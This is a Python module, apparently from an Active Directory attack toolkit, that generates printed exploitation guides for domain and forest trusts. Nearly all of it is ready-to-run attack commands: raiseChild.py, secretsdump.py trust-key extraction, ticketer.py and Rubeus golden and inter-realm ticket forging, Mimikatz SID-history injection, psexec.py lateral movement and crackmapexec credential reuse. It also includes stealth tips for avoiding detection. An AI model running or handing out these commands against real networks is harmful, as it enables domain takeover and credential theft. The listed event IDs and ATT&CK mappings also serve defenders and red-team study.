"""
Trust Exploitation Guide Generator
Generate detailed exploitation guides for different trust types
"""

from typing import Optional
from pathlib import Path
from datetime import datetime

from ..models import TrustType, TrustRelationship


class ExploitationGuide:
    """
    Generate exploitation guides for trust relationships
    """

    def __init__(self, output_dir: str = "trust_keys", verbose: bool = True):
        """
        Initialize guide generator

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.verbose = verbose

    def log(self, message: str, level: str = "info") -> None:
        """Print status message"""
        if not self.verbose:
            return
        prefixes = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{prefixes.get(level, '[*]')} {message}")

    def generate_guide(
            self,
            source_domain: str,
            target_domain: str,
            trust_type: str
    ) -> str:
        """
        Generate exploitation guide for a trust relationship

        Args:
            source_domain: Source domain
            target_domain: Target domain
            trust_type: Type of trust

        Returns:
            Guide text
        """
        trust_type_lower = trust_type.lower()

        if "parent" in trust_type_lower or "child" in trust_type_lower:
            return self._generate_parent_child_guide(source_domain, target_domain)
        elif "forest" in trust_type_lower:
            return self._generate_forest_guide(source_domain, target_domain)
        else:
            return self._generate_external_guide(source_domain, target_domain)

    def _generate_parent_child_guide(self, child_domain: str, parent_domain: str) -> str:
        """Generate guide for parent-child trust exploitation"""
        lines = [
            "=" * 70,
            "PARENT-CHILD TRUST EXPLOITATION GUIDE",
            "=" * 70,
            "",
            f"Child Domain: {child_domain}",
            f"Parent Domain (Forest Root): {parent_domain}",
            "",
            "OVERVIEW",
            "-" * 40,
            "Parent-child trusts are bidirectional and transitive by default.",
            "SID filtering is typically DISABLED for intra-forest trusts.",
            "This makes escalation from child to parent relatively straightforward.",
            "",
            "ATTACK METHODS",
            "=" * 40,
            "",
            "METHOD 1: SID History Injection (Recommended)",
            "-" * 40,
            "",
            "Automatically escalate to Enterprise Admin using Impacket:",
            "",
            f"    raiseChild.py {child_domain}/administrator:'password'@dc.{child_domain}",
            "",
            "This tool will:",
            "  1. Dump child domain's krbtgt hash",
            "  2. Create Golden Ticket with Enterprise Admins SID",
            "  3. Request inter-realm TGT to parent domain",
            "  4. DCSync the parent domain",
            "  5. You now have Enterprise Admin!",
            "",
            "METHOD 2: Manual Trust Key Exploitation",
            "-" * 40,
            "",
            "Step 1: Extract trust key from child domain",
            f"    secretsdump.py {child_domain}/admin:'pass'@dc -just-dc-user '{parent_domain.split('.')[0].upper()}$'",
            "",
            "Step 2: Get domain SIDs",
            f"    lookupsid.py {child_domain}/admin:'pass'@dc",
            "",
            "Step 3: Forge inter-realm TGT",
            f"    ticketer.py -nthash TRUST_KEY_HASH -domain-sid CHILD_SID \\",
            f"      -domain {child_domain} -spn krbtgt/{parent_domain} administrator",
            "",
            "Step 4: Use ticket",
            "    export KRB5CCNAME=administrator.ccache",
            f"    psexec.py -k -no-pass {parent_domain}/administrator@dc.{parent_domain}",
            "",
            "METHOD 3: Mimikatz SID History",
            "-" * 40,
            "",
            "On a DC in the child domain:",
            "",
            "    mimikatz # privilege::debug",
            f"    mimikatz # sid::add /sam:administrator /new:PARENT_SID-519",
            "",
            "The user now has Enterprise Admins SID in their SID history!",
            "",
            "DETECTION & OPSEC",
            "-" * 40,
            "• Event ID 4675: SIDs were filtered",
            "• Event ID 4765: SID History added",
            "• Event ID 4662: DCSync operation",
            "• Golden Tickets use RC4 by default - AES is stealthier",
            "",
            "MITRE ATT&CK",
            "-" * 40,
            "• T1134.005 - Access Token Manipulation: SID-History Injection",
            "• T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket",
            "• T1003.006 - OS Credential Dumping: DCSync",
        ]

        return "\n".join(lines)

    def _generate_forest_guide(self, source_forest: str, target_forest: str) -> str:
        """Generate guide for forest trust exploitation"""
        lines = [
            "=" * 70,
            "FOREST TRUST EXPLOITATION GUIDE",
            "=" * 70,
            "",
            f"Source Forest: {source_forest}",
            f"Target Forest: {target_forest}",
            "",
            "OVERVIEW",
            "-" * 40,
            "Forest trusts connect separate AD forests.",
            "SID filtering is ENABLED by default on forest trusts.",
            "This makes exploitation more challenging but not impossible.",
            "",
            "ATTACK METHODS",
            "=" * 40,
            "",
            "METHOD 1: Trust Key Extraction + Ticket Forging",
            "-" * 40,
            "",
            "Step 1: Extract trust key",
            f"    secretsdump.py {source_forest}/admin:'pass'@dc \\",
            f"      -just-dc-user '{target_forest.split('.')[0].upper()}$'",
            "",
            "Step 2: Forge inter-realm TGT",
            f"    Rubeus.exe asktgs /user:admin /domain:{source_forest} \\",
            f"      /service:krbtgt/{target_forest} /rc4:TRUST_KEY /ptt",
            "",
            "Step 3: Access target forest (as your current user)",
            f"    dir \\\\dc.{target_forest}\\sysvol",
            "",
            "NOTE: Without bypassing SID filtering, you only get access as a",
            "user from the trusted forest - not elevated privileges.",
            "",
            "METHOD 2: SID Filtering Bypass (If Disabled)",
            "-" * 40,
            "",
            "Check if SID filtering is disabled:",
            f"    netdom trust {source_forest} /domain:{target_forest} /quarantine",
            "",
            "If SID filtering is DISABLED (rare but happens):",
            f"    ticketer.py -nthash TRUST_KEY -domain-sid SOURCE_SID \\",
            f"      -domain {source_forest} -extra-sid TARGET_SID-519 \\",
            f"      -spn krbtgt/{target_forest} administrator",
            "",
            "METHOD 3: Credential Reuse",
            "-" * 40,
            "",
            "Often, administrators reuse credentials across forests.",
            "Try extracted credentials against target forest:",
            "",
            f"    crackmapexec smb dc.{target_forest} -u admin -p 'password'",
            "",
            "METHOD 4: Kerberos Delegation Abuse",
            "-" * 40,
            "",
            "If constrained/unconstrained delegation exists across trust:",
            "",
            "    # Find delegation",
            f"    findDelegation.py {source_forest}/admin:'pass' -target-domain {target_forest}",
            "",
            "DETECTION & OPSEC",
            "-" * 40,
            "• Forest trusts log cross-forest authentication",
            "• SID filtering violations create Event ID 4675",
            "• Use legitimate service accounts if possible",
            "",
            "MITRE ATT&CK",
            "-" * 40,
            "• T1550.001 - Use Alternate Authentication Material",
            "• T1558.003 - Steal or Forge Kerberos Tickets",
        ]

        return "\n".join(lines)

    def _generate_external_guide(self, source_domain: str, target_domain: str) -> str:
        """Generate guide for external trust exploitation"""
        lines = [
            "=" * 70,
            "EXTERNAL TRUST EXPLOITATION GUIDE",
            "=" * 70,
            "",
            f"Source Domain: {source_domain}",
            f"Target Domain: {target_domain}",
            "",
            "OVERVIEW",
            "-" * 40,
            "External trusts connect domains in different forests.",
            "Similar to forest trusts but non-transitive.",
            "SID filtering is typically ENABLED.",
            "",
            "ATTACK METHODS",
            "=" * 40,
            "",
            "METHOD 1: Trust Key Exploitation",
            "-" * 40,
            "",
            "Same as forest trust - extract key and forge tickets:",
            "",
            f"    # Extract trust key",
            f"    secretsdump.py {source_domain}/admin:'pass'@dc \\",
            f"      -just-dc-user '{target_domain.split('.')[0].upper()}$'",
            "",
            f"    # Forge ticket",
            f"    Rubeus.exe asktgs /service:krbtgt/{target_domain} /rc4:KEY /ptt",
            "",
            "METHOD 2: Check Trust Direction",
            "-" * 40,
            "",
            "External trusts may be one-way:",
            f"    nltest /domain_trusts /all_trusts",
            "",
            "If one-way inbound only, you cannot use credentials",
            "from source to access target.",
            "",
            "MITRE ATT&CK",
            "-" * 40,
            "• T1550.001 - Use Alternate Authentication Material",
        ]

        return "\n".join(lines)

    def print_guide(
            self,
            source_domain: str,
            target_domain: str,
            trust_type: str
    ) -> None:
        """Print exploitation guide to console"""
        guide = self.generate_guide(source_domain, target_domain, trust_type)
        print(guide)

    def save_guide(
            self,
            source_domain: str,
            target_domain: str,
            trust_type: str
    ) -> Path:
        """Save exploitation guide to file"""
        guide = self.generate_guide(source_domain, target_domain, trust_type)

        filename = f"exploitation_guide_{source_domain}_to_{target_domain}.txt"
        filepath = self.output_dir / filename

        filepath.write_text(guide)

        self.log(f"Guide saved to: {filepath}", "success")

        return filepath

    def generate_quick_reference(self) -> str:
        """Generate quick reference card for trust attacks"""
        lines = [
            "=" * 70,
            "TRUST EXPLOITATION QUICK REFERENCE",
            "=" * 70,
            "",
            "PARENT-CHILD TRUST (Easiest)",
            "-" * 40,
            "raiseChild.py DOMAIN/admin:'pass'@dc",
            "",
            "FOREST TRUST (With SID Filtering)",
            "-" * 40,
            "1. secretsdump.py DOMAIN/admin:'pass'@dc -just-dc-user 'TRUST$'",
            "2. Rubeus.exe asktgs /service:krbtgt/TARGET /rc4:KEY /ptt",
            "3. Access as trusted user (not admin)",
            "",
            "EXTRACT ANY TRUST KEY",
            "-" * 40,
            "secretsdump.py DOMAIN/admin:'pass'@dc | grep '\\$:'",
            "",
            "FORGE INTER-REALM TGT",
            "-" * 40,
            "ticketer.py -nthash KEY -domain-sid SID -domain DOM \\",
            "  -spn krbtgt/TARGET user",
            "",
            "USE FORGED TICKET",
            "-" * 40,
            "export KRB5CCNAME=user.ccache",
            "psexec.py -k -no-pass TARGET/user@dc.TARGET",
            "",
            "=" * 70,
        ]

        return "\n".join(lines)